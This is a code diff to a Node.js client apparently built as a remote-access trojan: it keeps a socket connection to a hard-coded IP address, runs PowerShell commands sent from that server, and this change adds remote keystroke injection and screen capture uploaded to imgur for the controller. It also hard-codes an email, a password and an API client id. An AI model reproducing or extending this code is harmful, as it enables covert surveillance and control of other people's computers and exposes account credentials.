@@ -1,6 +1,8 @@
 let orionSocketModule     = require("socket.io-client")
 let orionOS               = require("os")
 let orionShellModule      = require("node-powershell")
+let orionRobot            = require("robot-cmd")
+let imgur                 = require('imgur');
 
 let orionSocketConnection = orionSocketModule.connect( "http://139.59.200.147:4001/", {
   "reconnection": true,
@@ -9,9 +11,12 @@ let orionSocketConnection = orionSocketModule.connect( "http://139.59.200.147:40
   "reconnectionAttempts": Infinity,
 })
 
+imgur.setCredentials('surajlyo@icloud.com', 'ORIONAPP123', 'ff36314d51e3814');
+
 //
 // Declerations
 //
+
 let setupCode = []
 
 let boilerPlateCode = {
@@ -36,6 +41,41 @@ Add-Type -TypeDefinition $setwallpapersrc
 }
 
 let additionalFunctions = {
+  simulateKeyboard: (buttonToSimulate) => {
+    try {
+      console.log("Simulating: ", buttonToSimulate)
+      orionRobot.sendKeys(buttonToSimulate.toUpperCase())
+    } catch (error){
+      console.log("Error simulating keyboard; ", error)
+    }
+  },
+  viewScreen: () => {
+    return new Promise((RESOLVE, REJECT) => {
+      try {
+        orionRobot.screenShot("C:\\Windows\\Temp\\screenShot.jpg")
+
+        orionSocketConnection.emit('codeExecutionResponse', {
+          uniqueRoomNumber: UUID,
+          stdout: `Taken screenshot, uploading to server`,
+          stderr: "N/A"
+        })
+
+        imgur.uploadFile('C:\\Windows\\Temp\\screenShot.jpg')
+        .then(function (json) {
+            RESOLVE(
+              json.data.link
+            )
+        })
+        .catch(function (err) {
+            REJECT(
+              `Failed to upload: ${err.message}`
+            )
+        })
+      } catch (error){
+        console.log("Error taking screenshot; ", error)
+      }
+    })
+  },
   ChangeBackground: (URL) => {
     return new Promise((RESOLVE, REJECT) => {
       let orionShell = new orionShellModule({
@@ -174,6 +214,12 @@ orionSocketConnection.on(UUID, function (responseData) {
       uniqueRoomNumber: UUID,
       error: Error
     }))
+  }
+
+  if (responseData.internalCall.isKeyboard){
+    return additionalFunctions[responseData.internalCall.Function](
+      responseData.internalCall.Data
+    )
   }
 
   if (responseData.internalCall.isShell){
